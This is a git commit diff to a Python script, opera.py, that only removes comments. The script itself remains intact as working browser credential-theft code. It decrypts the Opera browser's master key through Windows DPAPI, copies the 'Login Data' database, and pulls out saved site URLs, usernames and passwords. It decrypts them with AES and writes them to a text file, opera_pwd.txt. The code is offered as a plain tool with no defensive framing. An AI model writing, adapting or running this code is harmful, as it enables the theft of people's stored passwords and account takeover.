e9c67bc3984467ebe4367561b3e0386b2d052f89
Vinícius Bruno <91799009+Vinnybrunn00@users.noreply.github.com>
2023-05-29 18:22:12 -0300

    Update opera.py

--- opera.py
+++ opera.py
@@ -9,8 +9,6 @@ from base64 import b64decode
 from Crypto.Cipher import DES3, AES
 
 def get_chrome_datetime(chromedate):
-    """Return a `datetime.datetime` object from a chrome format datetime
-    Since `chromedate` is formatted as the number of microseconds since January, 1601"""
     return datetime(1601, 1, 1) + timedelta(microseconds=chromedate)
 
 def get_encryption_key():
@@ -18,52 +16,37 @@ def get_encryption_key():
     with open(local_state_path, "r", encoding="utf-8") as f:
         local_state = f.read()
         local_state = json.loads(local_state)
-
-    # decode the encryption key from Base64
+        
     key = b64decode(local_state["os_crypt"]["encrypted_key"])
-    # remove DPAPI str
     key = key[5:]
-    # return decrypted key that was originally encrypted
-    # using a session key derived from current user's logon credentials
-    # doc: http://timgolden.me.uk/pywin32-docs/win32crypt.html
     return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
 
 def decrypt_password(password, key):
     try:
-        # get the initialization vector
         iv = password[3:15]
         password = password[15:]
-        # generate cipher
         cipher = AES.new(key, AES.MODE_GCM, iv)
-        # decrypt password
         return cipher.decrypt(password)[:-16].decode()
     except Exception as e:
         print(e)
         try:
             return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
         except:
-            # not supported
             return ""
 
 
 if __name__ == "__main__":
-    # get the AES key
     key = get_encryption_key()
-    # local sqlite Chrome database path
     db_path = os.path.join(os.environ["USERPROFILE"],"AppData", "Roaming", "Opera Software", "Opera Stable", "Login Data")
-    # copy the file to another location
-    # as the database will be locked if chrome is currently running
     filename = "OperaData.db"
 
-    file = open("opera_pwd.txt","w") # will save the creds into a txt file
+    file = open("opera_pwd.txt","w")
 
     shutil.copyfile(db_path, filename)
-    # connect to the database
     db = sqlite3.connect(filename)
     cursor = db.cursor()
-    # `logins` table has the data we need
     cursor.execute("select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins order by date_created")
-    # iterate over all rows
+    
     for row in cursor.fetchall():
         origin_url = row[0]
         action_url = row[1]
@@ -87,7 +70,6 @@ if __name__ == "__main__":
     cursor.close()
     db.close()
     try:
-        # try to remove the copied db file
         os.remove(filename)
     except:
         pass
